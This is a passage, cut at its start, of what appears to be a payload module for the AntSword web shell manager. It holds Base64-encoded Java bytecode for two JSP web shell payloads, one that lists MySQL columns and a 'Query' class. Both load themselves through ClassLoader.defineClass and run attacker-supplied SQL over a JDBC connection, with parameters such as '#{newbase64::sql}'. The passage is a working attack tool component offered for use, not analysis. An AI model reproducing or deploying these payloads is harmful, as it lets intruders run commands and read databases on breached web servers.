0OylaAQAGZGVjb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zAQAKZXhlY3V0ZVNRTAEAbyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztaKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3Nob3dDb2x1bW5zAQBcKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhhc291dHB1dAEAEkJhc2U2NERlY29kZVRvQnl0ZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAApTb3VyY2VGaWxlAQARU2hvd19jb2x1bW5zLmphdmEMAHAAcQwAZwBoDABpAGoBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAwA6gDrAQAKZ2V0UmVxdWVzdAEAD2phdmEvbGFuZy9DbGFzcwwA7ADtAQAQamF2YS9sYW5nL09iamVjdAcA7gwA7wDwAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAC2dldFJlc3BvbnNlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2xhbmcvRXhjZXB0aW9uDADxAPIMAPMA9AcA9QwA9gD3DAD4APkBABRhbnRzd29yZHJhbmRvbVByZWZpeAwAbgBsAQAGYmFzZTY0DABrAGwBAA9hbnRzd29yZENoYXJzZXQMAG0AbAEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAAMAHAA+gEAAy0+fAEAA3w8LQEAEWFudHN3b3JkYXJnZW5jb2RlAQAPYW50c3dvcmRhcmdjb25uAQANYW50c3dvcmRhcmdkYgEAEGFudHN3b3JkYXJndGFibGUBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAPsA+gwA/AD6DAD9AHcMAHYAdwwAbwBsDAB7AHwMAP4A/wEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAJRVJST1I6Ly8gDAD+AQAMAQEBAgwBAwEEDAB9AHcHAQUMAQYA+gcBBwwBCAEJDAEKAQsMAHQAdQEAEGphdmEvbGFuZy9TdHJpbmcMAH4AfwwAcAEMDAENAQIBAAINCgEAAQoMAQ4BDwwBEAERAQATJmNoYXJhY3RlckVuY29kaW5nPQcBEgwBEwEUBwEVDAEWARcHARgMARkBGgcBGwwBHAEdBwEeDAEfASAMASEBCwwBIgEjDAEkAQsBAAEJAQAOc2VsZWN0ICogZnJvbSABAAEuAQAKIGxpbWl0IDAsMAwAeQB6AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBAAJbQgwBJQEmDAEnASgMASkBKgwBKwEsBwEtDAEuAS8BAAxqYXZhLnZlcnNpb24HATAMATEAdwEAAzEuOQwBMgEJAQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIMATMA7QEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMAS4BNAEAG2RhdGFiYXNlL215c3FsL1Nob3dfY29sdW1ucwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADnNldENvbnRlbnRUeXBlAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAxnZXRQYXJhbWV0ZXIBAAZhcHBlbmQBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABHRyaW0BAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAFmphdmEvc3FsL0RyaXZlck1hbmFnZXIBAA1nZXRDb25uZWN0aW9uAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zcWwvQ29ubmVjdGlvbjsBABNqYXZhL3NxbC9Db25uZWN0aW9uAQAPY3JlYXRlU3RhdGVtZW50AQAWKClMamF2YS9zcWwvU3RhdGVtZW50OwEAEmphdmEvc3FsL1N0YXRlbWVudAEADGV4ZWN1dGVRdWVyeQEAKChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL1Jlc3VsdFNldDsBABJqYXZhL3NxbC9SZXN1bHRTZXQBAAtnZXRNZXRhRGF0YQEAHigpTGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhOwEAGmphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhAQAOZ2V0Q29sdW1uQ291bnQBAAMoKUkBAA1nZXRDb2x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',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}',
    [arg3]: '#{newbase64::db}',
    [arg4]: '#{newbase64::table}'
  },
  query: {
    _: 'yv66vgAAADEBRQoACQCICQBrAIkJAGsAiggAiwoABwCMCACNBwCOCgAHAI8HAJAKAJEAkgcAkwgAlAcAlQcAlgoACQCXCABsCgAHAJgKAJkAmgoAmQCbCABuCACcCQBrAJ0IAJ4JAGsAnwgAoAkAawChBwCiCACjCgAbAKQIAKUIAKYIAKcIAKgIAKkIAKoIAKsLAA0ArAsACwCtCwANAK0LAAsArgoAawCvCQBrALAKAGsAsQoAGwCyBwCzCgAtAIgIALQKAC0AtQoADgC2CgAtALYLAA0AtwoAGwC2CgBrALgKALkAugoAuwC8CgA6AL0KADoAvgcAvwoAawDACgA6AMEIAMIKAMMAxAgAxQoAOgDGCADHCADICgAHAMkIAMoHAMsKADoAzAgAzQoABwDOCgDPANAIANEIANIKADoA0woAOgDUCADVCADWCgA6ANcKADoA2AgA2QoA2gDbCwDcAN0LAN4A3wsA4ADhCwDiAOMLAOIA5AsA4ADlCwDgAOYKAGsA5wgA6AoAawDpBwDqCADrCQC7AOwKAJEAmgoABwDtCgC7AO4KAAcA7woACQC2CADwCAB7CADxCADyCgAHAPMHAPQBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHZW5jb2RlcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmNzAQAMcmFuZG9tUHJlZml4AQAQZGVjb2RlckNsYXNzZGF0YQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAZkZWNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMBAAxCYXNlNjRFbmNvZGUBAApleGVjdXRlU1FMAQBvKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO1opTGphdmEvbGFuZy9TdHJpbmc7AQAFcXVlcnkBAEooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBAApRdWVyeS5qYXZhDAB1AHYMAGwAbQwAbgBvAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQMAPUA9gEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMAPcA+AEAEGphdmEvbGFuZy9PYmplY3QHAPkMAPoA+wEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAtnZXRSZXNwb25zZQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA/AD9DAD+AP8HAQAMAQEBAgwBAwEEAQAUYW50c3dvcmRyYW5kb21QcmVmaXgMAHMAcQEABmJhc2U2NAwAcABxAQAPYW50c3dvcmRDaGFyc2V0DAByAHEBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADAB1AQUBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEADmFudHN3b3JkYXJnc3FsAQASYW50c3dvcmRhcmdkZWNvZGVyAQAJdGV4dC9odG1sDAEGAQUMAQcBBQwBCAB8DAB7AHwMAHQAcQwAgQCCDAEJAQoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwBCQELDAEMAQ0MAQ4BDwwAgwB8BwEQDAERAQUHARIMARMBFAwBFQEWDAB5AHoBABBqYXZhL2xhbmcvU3RyaW5nDACEAIUMAHUBFwEADGphdmEudmVyc2lvbgcBGAwBGQB8AQADMS45DAEaARQBABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RW5jb2RlcgwBGwD4AQAOZW5jb2RlVG9TdHJpbmcBAAJbQgwBHAEdAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBHgEfBwEgDAEhASIBAAZlbmNvZGUBAAMNfAoMASMBJAwBJQENAQACDQoBAAEKDAEmAScMASgBKQEAEyZjaGFyYWN0ZXJFbmNvZGluZz0HASoMASsBLAcBLQwBLgEvBwEwDAExATIHATMMATQBNQcBNgwBNwE4DAE5ARYMAToBOwwBPAEWDAB+AHwBAAMJfAkMAH8AgAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzDAE9AT4MAT8BQAwBQQFCDAFDAR8BAApnZXREZWNvZGVyAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBIQFEAQAUZGF0YWJhc2UvbXlzcWwvUXVlcnkBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5zZXRDb250ZW50VHlwZQEAFHNldENoYXJhY3RlckVuY29kaW5nAQAMZ2V0UGFyYW1ldGVyAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAljb21wYXJlVG8BAAlnZXRNZXRob2QBAAhnZXRCeXRlcwEABCgpW0IBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACnJlcGxhY2VBbGwBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABHRyaW0BAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAFmphdmEvc3FsL0RyaXZlck1hbmFnZXIBAA1nZXRDb25uZWN0aW9uAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zcWwvQ29ubmVjdGlvbjsBABNqYXZhL3NxbC9Db25uZWN0aW9uAQAPY3JlYXRlU3RhdGVtZW50AQAWKClMamF2YS9zcWwvU3RhdGVtZW50OwEAEmphdmEvc3FsL1N0YXRlbWVudAEADGV4ZWN1dGVRdWVyeQEAKChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL1Jlc3VsdFNl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',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}',
    [arg3]: '#{newbase64::sql}'
  }
})